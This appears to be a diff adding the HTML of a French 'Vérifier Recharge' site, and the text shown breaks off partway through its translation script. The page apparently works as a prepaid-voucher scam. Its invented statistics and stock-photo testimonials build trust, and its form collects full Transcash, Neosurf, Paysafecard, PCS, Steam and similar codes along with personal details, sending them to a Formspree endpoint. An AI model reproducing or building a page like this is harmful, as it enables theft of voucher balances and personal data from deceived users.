@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérifier Recharge - Service Professionnel</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #4361ee;
+      --secondary: #3f37c9;
+      --accent: #f72585;
+      --light: #f8f9fa;
+      --dark: #212529;
+      --success: #4cc9f0;
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background-color: #f5f7ff;
+      color: var(--dark);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+    
+    /* Header Style */
+    .hero {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      padding: 3rem 0;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiIHBhdHRlcm5UcmFuc2Zvcm09InJvdGF0ZSg0NSkiPjxyZWN0IHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgZmlsbD0icmdiYSgyNTUsMjU1LDI1NSwwLjA1KSIvPjwvcGF0dGVybj48L2RlZnM+PHJlY3QgZmlsbD0idXJsKCNwYXR0ZXJuKSIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIvPjwvc3ZnPg==');
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 1rem;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .logo {
+      font-size: 2.8rem;
+      font-weight: 800;
+      margin-bottom: 1rem;
+      position: relative;
+      display: inline-block;
+    }
+    
+    .logo::after {
+      content: '';
+      position: absolute;
+      bottom: -10px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 4px;
+      background: var(--accent);
+      border-radius: 2px;
+    }
+    
+    .tagline {
+      font-size: 1.3rem;
+      max-width: 700px;
+      margin: 0 auto 2rem;
+      opacity: 0.9;
+    }
+    
+    /* Logo V */
+    .v-logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 3rem;
+      color: white;
+      z-index: 10;
+      text-shadow: 2px 2px 5px rgba(0,0,0,0.3);
+    }
+    
+    /* Navigation */
+    .nav {
+      display: flex;
+      justify-content: center;
+      gap: 1.5rem;
+      margin-bottom: 1.5rem;
+      flex-wrap: wrap;
+    }
+    
+    .nav-btn {
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(5px);
+      color: white;
+      border: 2px solid rgba(255,255,255,0.3);
+      padding: 0.8rem 1.8rem;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      font-size: 1rem;
+    }
+    
+    .nav-btn:hover {
+      background: rgba(255,255,255,0.25);
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+    
+    .nav-btn.primary {
+      background: var(--accent);
+      border-color: var(--accent);
+    }
+    
+    .lang-switch {
+      background: rgba(0,0,0,0.2);
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    
+    /* Stats Section */
+    .stats-section {
+      padding: 4rem 0;
+      background: white;
+    }
+    
+    .stats-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 2rem;
+    }
+    
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 2rem;
+      margin-top: 3rem;
+    }
+    
+    .stat-card {
+      background: linear-gradient(135deg, #f8f9fa, white);
+      border-radius: 15px;
+      padding: 2rem;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+      transition: transform 0.3s ease;
+      border: 1px solid rgba(0,0,0,0.05);
+    }
+    
+    .stat-card:hover {
+      transform: translateY(-10px);
+      box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+    }
+    
+    .stat-number {
+      font-size: 3rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+      background: linear-gradient(to right, var(--primary), var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .stat-label {
+      font-size: 1.1rem;
+      color: #6c757d;
+    }
+    
+    /* Testimonials */
+    .testimonials {
+      padding: 5rem 0;
+      background: linear-gradient(to bottom, #f5f7ff, #e9ecef);
+      position: relative;
+    }
+    
+    .testimonials::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgcGF0dGVyblRyYW5zZm9ybT0icm90YXRlKDQ1KSI+PHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiBmaWxsPSJyZ2JhKDY3LDk3LDIzOCwwLjAzKSIvPjwvcGF0dGVybj48L2RlZnM+PHJlY3QgZmlsbD0idXJsKCNwYXR0ZXJuKSIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIvPjwvc3ZnPg==');
+    }
+    
+    .section-title {
+      text-align: center;
+      margin-bottom: 3rem;
+      position: relative;
+    }
+    
+    .section-title h2 {
+      font-size: 2.2rem;
+      color: var(--dark);
+      display: inline-block;
+    }
+    
+    .section-title h2::after {
+      content: '';
+      position: absolute;
+      bottom: -15px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 4px;
+      background: var(--accent);
+      border-radius: 2px;
+    }
+    
+    .testimonials-slider {
+      display: flex;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+      scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
+      gap: 2rem;
+      padding: 1rem 0;
+      margin: 0 auto;
+      max-width: 1200px;
+    }
+    
+    .testimonial-card {
+      scroll-snap-align: start;
+      flex: 0 0 350px;
+      background: white;
+      border-radius: 15px;
+      padding: 2rem;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      position: relative;
+    }
+    
+    .testimonial-card::before {
+      content: '\201C';
+      font-size: 5rem;
+      color: rgba(67, 97, 238, 0.1);
+      position: absolute;
+      top: 10px;
+      left: 20px;
+      line-height: 1;
+    }
+    
+    .testimonial-content {
+      margin-bottom: 1.5rem;
+      font-style: italic;
+      color: #495057;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .testimonial-author {
+      display: flex;
+      align-items: center;
+    }
+    
+    .author-avatar {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-right: 1rem;
+      border: 3px solid var(--primary);
+    }
+    
+    .author-info h4 {
+      margin-bottom: 0.2rem;
+      color: var(--dark);
+    }
+    
+    .author-info p {
+      color: #6c757d;
+      font-size: 0.9rem;
+    }
+    
+    .rating {
+      color: #ffc107;
+      margin-top: 0.3rem;
+    }
+    
+    /* Form Section */
+    .form-section {
+      padding: 5rem 0;
+      background: white;
+    }
+    
+    .form-container {
+      max-width: 800px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.1);
+      overflow: hidden;
+      position: relative;
+    }
+    
+    .form-header {
+      background: linear-gradient(to right, var(--primary), var(--secondary));
+      color: white;
+      padding: 1.5rem;
+      text-align: center;
+    }
+    
+    .form-header h2 {
+      font-size: 1.8rem;
+    }
+    
+    .form-body {
+      padding: 2rem;
+    }
+    
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+    }
+    
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    
+    .form-group.full-width {
+      grid-column: span 2;
+    }
+    
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+      color: var(--dark);
+    }
+    
+    .form-label span {
+      color: var(--accent);
+    }
+    
+    .form-control {
+      width: 100%;
+      padding: 0.8rem 1rem;
+      border: 1px solid #dee2e6;
+      border-radius: 8px;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+    }
+    
+    .form-control:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+      outline: none;
+    }
+    
+    .country-select {
+      display: flex;
+      align-items: center;
+    }
+    
+    .country-flag {
+      margin-right: 10px;
+      font-size: 1.5rem;
+    }
+    
+    .country-code-select {
+      flex: 0 0 120px;
+      margin-right: 10px;
+    }
+    
+    /* Recharge Code Field */
+    .code-field {
+      position: relative;
+    }
+    
+    .code-input {
+      padding-right: 40px;
+      letter-spacing: 1px;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+    }
+    
+    .toggle-visibility {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #adb5bd;
+      font-size: 1.2rem;
+    }
+    
+    /* Submit Button */
+    .submit-btn {
+      background: linear-gradient(to right, var(--accent), #f15bb5);
+      color: white;
+      border: none;
+      padding: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.1rem;
+      font-weight: 600;
+      width: 100%;
+      transition: all 0.3s ease;
+      margin-top: 1rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .submit-btn:hover {
+      background: linear-gradient(to right, #f15bb5, var(--accent));
+      box-shadow: 0 5px 15px rgba(247, 37, 133, 0.4);
+      transform: translateY(-2px);
+    }
+    
+    /* Footer */
+    .footer {
+      background: var(--dark);
+      color: white;
+      padding: 3rem 0;
+      text-align: center;
+    }
+    
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 2rem;
+    }
+    
+    .copyright {
+      margin-top: 2rem;
+      padding-top: 2rem;
+      border-top: 1px solid rgba(255,255,255,0.1);
+      color: #adb5bd;
+    }
+    
+    /* Animation */
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    .floating {
+      animation: float 3s ease-in-out infinite;
+    }
+    
+    /* Messages flash */
+    .alert {
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+      font-weight: 600;
+      display: none;
+    }
+    
+    .alert-success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+    
+    .alert-error {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+    
+    /* RESPONSIVE DESIGN AMÉLIORÉ */
+    
+    /* Desktop (1200px et plus) */
+    @media (min-width: 1200px) {
+      .container {
+        padding: 0 2rem;
+      }
+      
+      .stats-grid {
+        grid-template-columns: repeat(4, 1fr);
+      }
+      
+      .testimonials-slider {
+        padding: 1rem 2rem;
+      }
+      
+      .testimonial-card {
+        flex: 0 0 380px;
+      }
+    }
+    
+    /* Tablette (768px à 1199px) */
+    @media (min-width: 768px) and (max-width: 1199px) {
+      .logo {
+        font-size: 2.4rem;
+      }
+      
+      .tagline {
+        font-size: 1.2rem;
+      }
+      
+      .nav {
+        gap: 1rem;
+      }
+      
+      .nav-btn {
+        padding: 0.7rem 1.5rem;
+        font-size: 0.95rem;
+      }
+      
+      .stats-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 1.5rem;
+      }
+      
+      .stat-card {
+        padding: 1.5rem;
+      }
+      
+      .stat-number {
+        font-size: 2.5rem;
+      }
+      
+      .testimonial-card {
+        flex: 0 0 320px;
+      }
+      
+      .form-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 1.2rem;
+      }
+      
+      .form-container {
+        margin: 0 2rem;
+      }
+      
+      .section-title h2 {
+        font-size: 2rem;
+      }
+    }
+    
+    /* Mobile (767px et moins) */
+    @media (max-width: 767px) {
+      .hero {
+        padding: 2rem 0;
+      }
+      
+      .container {
+        padding: 0 1rem;
+      }
+      
+      .logo {
+        font-size: 2rem;
+      }
+      
+      .tagline {
+        font-size: 1.1rem;
+        margin: 0 auto 1.5rem;
+      }
+      
+      .nav {
+        flex-direction: column;
+        align-items: center;
+        gap: 0.8rem;
+      }
+      
+      .nav-btn {
+        width: 80%;
+        max-width: 280px;
+        text-align: center;
+        padding: 0.8rem 1rem;
+        font-size: 0.9rem;
+      }
+      
+      .lang-switch {
+        margin-top: 0.5rem;
+      }
+      
+      .stats-section {
+        padding: 3rem 0;
+      }
+      
+      .stats-container {
+        padding: 0 1rem;
+      }
+      
+      .stats-grid {
+        grid-template-columns: 1fr;
+        gap: 1.5rem;
+        margin-top: 2rem;
+      }
+      
+      .stat-card {
+        padding: 1.5rem;
+      }
+      
+      .stat-number {
+        font-size: 2.2rem;
+      }
+      
+      .stat-label {
+        font-size: 1rem;
+      }
+      
+      .testimonials {
+        padding: 3rem 0;
+      }
+      
+      .testimonials-slider {
+        padding: 1rem;
+        gap: 1rem;
+      }
+      
+      .testimonial-card {
+        flex: 0 0 280px;
+        padding: 1.5rem;
+      }
+      
+      .section-title h2 {
+        font-size: 1.8rem;
+      }
+      
+      .form-section {
+        padding: 3rem 0;
+      }
+      
+      .form-container {
+        margin: 0 1rem;
+        max-width: none;
+      }
+      
+      .form-grid {
+        grid-template-columns: 1fr;
+        gap: 1rem;
+      }
+      
+      .form-group.full-width {
+        grid-column: span 1;
+      }
+      
+      .form-body {
+        padding: 1.5rem;
+      }
+      
+      .form-header h2 {
+        font-size: 1.5rem;
+      }
+      
+      .form-header p {
+        font-size: 0.9rem;
+      }
+      
+      .country-select {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 0.5rem;
+      }
+      
+      .country-code-select {
+        flex: none;
+        margin-right: 0;
+      }
+      
+      .submit-btn {
+        font-size: 1rem;
+        padding: 0.9rem;
+      }
+      
+      .footer {
+        padding: 2rem 0;
+      }
+      
+      .footer-content {
+        padding: 0 1rem;
+      }
+      
+      .footer-content h3 {
+        font-size: 1.5rem !important;
+      }
+    }
+    
+    /* Très petits écrans (480px et moins) */
+    @media (max-width: 480px) {
+      .logo {
+        font-size: 1.8rem;
+      }
+      
+      .tagline {
+        font-size: 1rem;
+      }
+      
+      .nav-btn {
+        width: 90%;
+        font-size: 0.85rem;
+      }
+      
+      .stat-number {
+        font-size: 2rem;
+      }
+      
+      .testimonial-card {
+        flex: 0 0 260px;
+        padding: 1.2rem;
+      }
+      
+      .section-title h2 {
+        font-size: 1.6rem;
+      }
+      
+      .form-header {
+        padding: 1.2rem;
+      }
+      
+      .form-body {
+        padding: 1.2rem;
+      }
+      
+      .country-select {
+        gap: 0.3rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Hero Section -->
+  <section class="hero">
+    <div class="v-logo"><i class="fas fa-check-circle"></i></div>
+    <div class="container">
+      <h1 class="logo" data-translate="title">Vérifier Recharge</h1>
+      <p class="tagline" data-translate="tagline">La confiance, la rapidité et la disponibilité au cœur de notre service</p>
+      
+      <div class="nav">
+        <button class="nav-btn primary" data-translate="verifyNow" onclick="document.getElementById('recharge-form').scrollIntoView({behavior: 'smooth'})">Vérifier Maintenant</button>
+        <button class="nav-btn" data-translate="contactUs" onclick="document.getElementById('contact-form').scrollIntoView({behavior: 'smooth'})">Nous Contacter</button>
+        <button class="lang-switch" onclick="toggleLanguage()">
+          <i class="fas fa-globe"></i> <span id="lang-display">FR | EN</span>
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Stats Section -->
+  <section class="stats-section">
+    <div class="stats-container">
+      <div class="section-title">
+        <h2 data-translate="discoverService">Découvrez Notre Service</h2>
+      </div>
+      
+      <div class="stats-grid">
+        <div class="stat-card floating">
+          <div class="stat-number">250,000+</div>
+          <div class="stat-label" data-translate="verificationsApproved">Vérifications approuvées</div>
+        </div>
+        
+        <div class="stat-card floating" style="animation-delay: 0.2s;">
+          <div class="stat-number">10+</div>
+          <div class="stat-label" data-translate="rechargeTypesSupported">Types de recharge supportés</div>
+        </div>
+        
+        <div class="stat-card floating" style="animation-delay: 0.4s;">
+          <div class="stat-number">&lt; 5 min</div>
+          <div class="stat-label" data-translate="averageVerificationTime">Temps de vérification moyen</div>
+        </div>
+        
+        <div class="stat-card floating" style="animation-delay: 0.6s;">
+          <div class="stat-number">24/7</div>
+          <div class="stat-label" data-translate="serviceAvailable">Service disponible</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Testimonials Section -->
+  <section class="testimonials">
+    <div class="container">
+      <div class="section-title">
+        <h2 data-translate="userTestimonials">Témoignages de nos Utilisateurs</h2>
+      </div>
+      
+      <div class="testimonials-slider">
+        <div class="testimonial-card">
+          <div class="testimonial-content" data-translate="testimonial1">
+            Excellent service client et processus de vérification très professionnel. Je recommande vivement ce service à tous ceux qui veulent une solution fiable.
+          </div>
+          <div class="testimonial-author">
+            <img src="https://randomuser.me/api/portraits/women/43.jpg" alt="Sophie Laurent" class="author-avatar">
+            <div class="author-info">
+              <h4>Sophie Laurent</h4>
+              <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="testimonial-card">
+          <div class="testimonial-content" data-translate="testimonial2">
+            Fiable et sécurisé, je n'ai jamais eu de problème avec mes recharges. Le support répond rapidement et le service est disponible à toute heure.
+          </div>
+          <div class="testimonial-author">
+            <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Pierre Moreau" class="author-avatar">
+            <div class="author-info">
+              <h4>Pierre Moreau</h4>
+              <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="testimonial-card">
+          <div class="testimonial-content" data-translate="testimonial3">
+            Service ultra rapide ! Ma recharge a été vérifiée en moins de 3 minutes. L'interface est simple et intuitive. Je reviendrai certainement.
+          </div>
+          <div class="testimonial-author">
+            <img src="https://randomuser.me/api/portraits/women/65.jpg" alt="Amélie Dubois" class="author-avatar">
+            <div class="author-info">
+              <h4>Amélie Dubois</h4>
+              <div class="rating">
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star-half-alt"></i>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Features Section -->
+  <section class="stats-section" style="background-color: #f8f9fa;">
+    <div class="stats-container">
+      <div class="section-title">
+        <h2 data-translate="ourAdvantages">Nos Avantages</h2>
+      </div>
+      
+      <div class="stats-grid">
+        <div class="stat-card">
+          <i class="fas fa-shield-alt" style="font-size: 2.5rem; color: var(--primary); margin-bottom: 1rem;"></i>
+          <h3 data-translate="trust">Confiance</h3>
+          <p data-translate="trustDesc">Service approuvé par nos partenaires</p>
+        </div>
+        
+        <div class="stat-card">
+          <i class="fas fa-bolt" style="font-size: 2.5rem; color: var(--primary); margin-bottom: 1rem;"></i>
+          <h3 data-translate="speed">Rapidité</h3>
+          <p data-translate="speedDesc">Vérification en moins de 5 minutes</p>
+        </div>
+        
+        <div class="stat-card">
+          <i class="fas fa-clock" style="font-size: 2.5rem; color: var(--primary); margin-bottom: 1rem;"></i>
+          <h3 data-translate="availability">Disponibilité</h3>
+          <p data-translate="availabilityDesc">Service 24h/24, 7j/7</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Form Section -->
+  <section class="form-section" id="recharge-form">
+    <div class="form-container">
+      <div class="form-header">
+        <h2 data-translate="verifyMyRecharge">Vérifier Ma Recharge</h2>
+        <p data-translate="formDescription">Remplissez le formulaire pour vérifier et activer votre recharge</p>
+      </div>
+      
+      <div class="form-body">
+        <!-- Message de succès/erreur -->
+        <div id="form-alert" class="alert" style="display: none;"></div>
+        
+        <form action="https://formspree.io/f/xyzperok" method="POST" id="verification-form">
+          <input type="hidden" name="form_type" value="recharge_verification">
+          
+          <div class="form-grid">
+            <div class="form-group">
+              <label class="form-label"><span data-translate="lastName">Nom</span> <span>*</span></label>
+              <input type="text" name="lastname" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label"><span data-translate="firstName">Prénom</span> <span>*</span></label>
+              <input type="text" name="firstname" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label"><span data-translate="email">E-mail</span> <span>*</span></label>
+              <input type="email" name="email" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label"><span data-translate="phone">Téléphone</span> <span>*</span></label>
+              <div class="country-select">
+                <span class="country-flag" id="selected-flag">🇫🇷</span>
+                <select name="country_code" class="form-control country-code-select" id="country-code" onchange="updateFlag()" required>
+                  <!-- Europe -->
+                  <optgroup label="Europe">
+                    <option value="+33" data-flag="🇫🇷">France (+33)</option>
+                    <option value="+32" data-flag="🇧🇪">Belgique (+32)</option>
+                    <option value="+41" data-flag="🇨🇭">Suisse (+41)</option>
+                    <option value="+49" data-flag="🇩🇪">Allemagne (+49)</option>
+                    <option value="+44" data-flag="🇬🇧">Royaume-Uni (+44)</option>
+                  </optgroup>
+                  
+                  <!-- Afrique -->
+                  <optgroup label="Afrique">
+                    <option value="+225" data-flag="🇨🇮">Côte d'Ivoire (+225)</option>
+                    <option value="+221" data-flag="🇸🇳">Sénégal (+221)</option>
+                    <option value="+229" data-flag="🇧🇯">Bénin (+229)</option>
+                    <option value="+226" data-flag="🇧🇫">Burkina Faso (+226)</option>
+                    <option value="+223" data-flag="🇲🇱">Mali (+223)</option>
+                    <option value="+224" data-flag="🇬🇳">Guinée (+224)</option>
+                    <option value="+227" data-flag="🇳🇪">Niger (+227)</option>
+                    <option value="+228" data-flag="🇹🇬">Togo (+228)</option>
+                    <option value="+237" data-flag="🇨🇲">Cameroun (+237)</option>
+                    <option value="+242" data-flag="🇨🇬">Congo (+242)</option>
+                    <option value="+243" data-flag="🇨🇩">RDC (+243)</option>
+                    <option value="+212" data-flag="🇲🇦">Maroc (+212)</option>
+                    <option value="+213" data-flag="🇩🇿">Algérie (+213)</option>
+                    <option value="+216" data-flag="🇹🇳">Tunisie (+216)</option>
+                  </optgroup>
+                  
+                  <!-- Amérique -->
+                  <optgroup label="Amérique">
+                    <option value="+1" data-flag="🇺🇸">USA/Canada (+1)</option>
+                    <option value="+52" data-flag="🇲🇽">Mexique (+52)</option>
+                    <option value="+55" data-flag="🇧🇷">Brésil (+55)</option>
+                  </optgroup>
+                  
+                  <!-- Asie -->
+                  <optgroup label="Asie">
+                    <option value="+86" data-flag="🇨🇳">Chine (+86)</option>
+                    <option value="+91" data-flag="🇮🇳">Inde (+91)</option>
+                  </optgroup>
+                </select>
+                <input type="tel" name="phone" class="form-control" required>
+              </div>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label"><span data-translate="rechargeType">Type de recharge</span> <span>*</span></label>
+              <select name="recharge_type" class="form-control" required>
+                <option value="Transcash">Transcash</option>
+                <option value="Neosurf">Neosurf</option>
+                <option value="Paysafecard">Paysafecard</option>
+                <option value="PCS">PCS</option>
+                <option value="Cashlib">Cashlib</option>
+                <option value="Toneo">Toneo</option>
+                <option value="Google Play">Google Play</option>
+                <option value="iTunes">iTunes</option>
+                <option value="Steam">Steam</option>
+                <option value="Autre">Interac</option>
+              </select>
+            </div>
+            
+            <div class="form-group">
+              <label class="form-label"><span data-translate="amount">Montant (€)</span> <span>*</span></label>
+              <input type="number" name="amount" class="form-control" min="1" required>
+            </div>
+            
+            <div class="form-group full-width code-field">
+              <label class="form-label"><span data-translate="rechargeCode">Code de recharge</span> <span>*</span></label>
+              <input type="password" name="recharge_code" class="form-control code-input" required 
+                     placeholder="XXXX-XXXX-XXXX" pattern="[A-Za-z0-9-]{12,16}">
+              <button type="button" class="toggle-visibility" onclick="toggleCodeVisibility()">
+                <i class="far fa-eye"></i>
+              </button>
+              <small style="display: block; margin-top: 5px; color: #6c757d;" data-translate="codeFormat">Format : 12-16 caractères alphanumériques avec tirets</small>
+            </div>
+            
+            <div class="form-group full-width">
+              <button type="submit" class="submit-btn" id="submit-btn" data-translate="verifyButton">Vérifier Ma Recharge</button>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- Steps Section -->
+  <section class="stats-section" style="background: linear-gradient(to right, var(--primary), var(--secondary)); color: white;">
+    <div class="stats-container">
+      <div class="section-title">
+        <h2 style="color: white;" data-translate="validationSteps">Étapes de Validation</h2>
+        <p style="color: rgba(255,255,255,0.8);" data-translate="stepsDescription">Un processus simple et sécurisé en quelques étapes</p>
+      </div>
+      
+      <div class="stats-grid">
+        <div class="stat-card" style="background: rgba(255,255,255,0.1); backdrop-filter: blur(5px); color: white;">
+          <div style="font-size: 3rem; font-weight: bold; margin-bottom: 1rem; color: white;">1</div>
+          <h3 style="color: white;" data-translate="step1Title">Remplissez le formulaire</h3>
+          <p style="color: rgba(255,255,255,0.8);" data-translate="step1Desc">Saisissez vos informations et votre code de recharge</p>
+        </div>
+        
+        <div class="stat-card" style="background: rgba(255,255,255,0.1); backdrop-filter: blur(5px); color: white;">
+          <div style="font-size: 3rem; font-weight: bold; margin-bottom: 1rem; color: white;">2</div>
+          <h3 style="color: white;" data-translate="step2Title">Vérification sécurisée</h3>
+          <p style="color: rgba(255,255,255,0.8);" data-translate="step2Desc">Notre équipe vérifie la validité de votre code</p>
+        </div>
+        
+        <div class="stat-card" style="background: rgba(255,255,255,0.1); backdrop-filter: blur(5px); color: white;">
+          <div style="font-size: 3rem; font-weight: bold; margin-bottom: 1rem; color: white;">3</div>
+          <h3 style="color: white;" data-translate="step3Title">Validation</h3>
+          <p style="color: rgba(255,255,255,0.8);" data-translate="step3Desc">Confirmation de l'activation de votre recharge</p>
+        </div>
+        
+        <div class="stat-card" style="background: rgba(255,255,255,0.1); backdrop-filter: blur(5px); color: white;">
+          <div style="font-size: 3rem; font-weight: bold; margin-bottom: 1rem; color: white;">4</div>
+          <h3 style="color: white;" data-translate="step4Title">Notification</h3>
+          <p style="color: rgba(255,255,255,0.8);" data-translate="step4Desc">Vous recevez une confirmation par email</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Contact Form -->
+  <section class="form-section" id="contact-form" style="padding-bottom: 8rem;">
+    <div class="form-container" style="max-width: 600px;">
+      <div class="form-header">
+        <h2 data-translate="contactUsTitle">Nous Contacter</h2>
+        <p data-translate="contactDescription">Des questions ? Notre équipe est là pour vous aider</p>
+      </div>
+      
+      <div class="form-body">
+        <!-- Message de succès/erreur -->
+        <div id="contact-alert" class="alert" style="display: none;"></div>
+        
+        <form action="https://formspree.io/f/xnnzpewy" method="POST" id="contactForm">
+          <input type="hidden" name="form_type" value="contact_request">
+          
+          <div class="form-group">
+            <label class="form-label"><span data-translate="name">Nom</span> <span>*</span></label>
+            <input type="text" name="name" class="form-control" required>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label"><span data-translate="email">E-mail</span> <span>*</span></label>
+            <input type="email" name="email" class="form-control" required>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label"><span data-translate="subject">Sujet</span> <span>*</span></label>
+            <input type="text" name="subject" class="form-control" required>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label"><span data-translate="message">Message</span> <span>*</span></label>
+            <textarea name="message" class="form-control" rows="5" required></textarea>
+          </div>
+          
+          <div class="form-group">
+            <button type="submit" class="submit-btn" id="contact-submit-btn" data-translate="sendMessage">Envoyer le Message</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-content">
+      <h3 style="font-size: 1.8rem; margin-bottom: 1.5rem;" data-translate="title">Vérifier Recharge</h3>
+      <p data-translate="footerDescription">Votre partenaire de confiance pour la vérification de recharges</p>
+      
+      <div class="copyright" data-translate="copyright">
+        © 2024 Vérifier Recharge. Tous droits réservés.
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // ====================
+    // SYSTÈME MULTILINGUE CORRIGÉ
+    // ====================
+    const translations = {
+      fr: {
+        // Header
+        title: "Vérifier Recharge",
+        tagline: "La confiance, la rapidité et la disponibilité au cœur de notre service",
+        verifyNow: "Vérifier Maintenant",
+        contactUs: "Nous Contacter",
+        
+        // Stats Section
+        discoverService: "Découvrez Notre Service",
+        verificationsApproved: "Vérifications approuvées",
+        rechargeTypesSupported: "Types de recharge supportés",
+        averageVerificationTime: "Temps de vérification moyen",
+        serviceAvailable: "Service disponible",
+        
+        // Testimonials
+        userTestimonials: "Témoignages de nos Utilisateurs",
+        testimonial1: "Excellent service client et processus de vérification très professionnel. Je recommande vivement ce service à tous ceux qui veulent une solution fiable.",
